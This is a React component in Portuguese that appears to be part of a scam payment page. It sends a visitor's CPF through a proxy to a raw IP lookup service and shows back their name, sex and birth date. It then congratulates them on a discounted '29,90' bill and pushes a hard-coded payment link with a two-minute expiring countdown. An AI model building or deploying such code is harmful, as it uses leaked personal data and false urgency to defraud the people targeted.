// src/components/AprovadoInline.tsx
import { useEffect, useState } from "react";
import Confetti from "react-confetti";
import useWindowSize from "react-use/lib/useWindowSize";

type DadosPessoa = {
  cpf: string;
  nome: string;
  sexo: string;
  nascimento: string;
};

interface AprovadoInlineProps {
  cpf: string;
  paymentLink?: string; // opcional, caso queira customizar o link
}

export default function AprovadoInline({
  cpf,
  paymentLink = "https://app.express-pay.app/link/93360161-fed0-4ae0-a8ee-b366350b435e",
}: AprovadoInlineProps) {
  const [dados, setDados] = useState<DadosPessoa | null>(null);
  const [erro, setErro] = useState<string | null>(null);
  const [tempoRestante, setTempoRestante] = useState(120); // 2 minutos
  const { width } = useWindowSize(); // confete só precisa de width; altura vamos travar no card

  useEffect(() => {
    if (!cpf) {
      setErro("CPF não informado.");
      return;
    }

    const fetchResultado = async () => {
      try {
        const response = await fetch(
          `https://proxy-1mu0.onrender.com/http://185.101.104.231:3001/search?cpf=${cpf}`
        );
        if (!response.ok) throw new Error("Erro ao buscar CPF");

        const text = await response.text();
        const [cpfRetorno, nome, sexo, nascimento] = text.replace("%", "").split("|");

        setDados({
          cpf: cpfRetorno,
          nome,
          sexo,
          nascimento,
        });
      } catch {
        setErro("Não foi possível obter o resultado.");
      }
    };

    fetchResultado();
  }, [cpf]);

  useEffect(() => {
    if (!dados) return;
    const timer = setInterval(() => {
      setTempoRestante((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [dados]);

  const formatarTempo = (segundos: number) => {
    const min = Math.floor(segundos / 60).toString().padStart(2, "0");
    const sec = (segundos % 60).toString().padStart(2, "0");
    return `${min}:${sec}`;
  };

  return (
    <div className="relative w-full">
      {/* Confetes dentro da área do card, para não tomar a tela toda */}
      {dados && (
        <div className="absolute inset-x-0 -top-2 pointer-events-none">
          <Confetti width={Math.min(width, 1024)} height={180} numberOfPieces={180} recycle={false} />
        </div>
      )}

      <div className="bg-white w-full rounded-md shadow-xl p-6 text-center overflow-hidden">
        {erro ? (
          <p className="text-base sm:text-lg text-red-600">{erro}</p>
        ) : !dados ? (
          <p className="text-base sm:text-lg animate-pulse text-[#333]">Consultando CPF...</p>
        ) : (
          <>
            <h1 className="text-3xl sm:text-4xl font-extrabold mb-2 text-[#1e2f70]">🎉 Parabéns!</h1>

            <p className="text-lg sm:text-xl mb-4 text-[#333]">
              {dados.nome}, você conseguiu!{" "}
              <span className="font-extrabold text-[#ff6a00] underline underline-offset-2">
                sua fatura pagando AGORA sai a 29,90
              </span>
            </p>

            <div className="bg-[#f8fafc] text-[#333] rounded-lg p-4 shadow-sm text-left border border-gray-100">
              <p><strong>CPF:</strong> {dados.cpf}</p>
              <p><strong>Sexo:</strong> {dados.sexo}</p>
              {dados.nascimento && <p><strong>Nascimento:</strong> {dados.nascimento}</p>}
            </div>

            <div className="mt-6 bg-gradient-to-r from-[#ff6a00] to-yellow-400 p-5 rounded-xl shadow-lg">
              <p className="text-xl font-semibold text-white mb-2">
                Pague agora com <span className="underline underline-offset-4">desconto exclusivo</span>!
              </p>

              <p className="text-2xl sm:text-3xl font-extrabold text-[#1e2f70] drop-shadow-md">
                Oferta expira em: <span className="text-white">{formatarTempo(tempoRestante)}</span>
              </p>

              {tempoRestante > 0 ? (
                <a
                  href={paymentLink}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="mt-4 inline-block px-8 py-3 rounded-full bg-white text-[#ff6a00] font-bold text-lg shadow-lg transition-transform hover:scale-105"
                >
                  🎯 PAGAR COM DESCONTO AGORA
                </a>
              ) : (
                <p className="mt-4 text-base sm:text-lg text-white font-bold">
                  ⏳ Oferta expirada. Tente novamente mais tarde.
                </p>
              )}
            </div>
          </>
        )}
      </div>
    </div>
  );
}
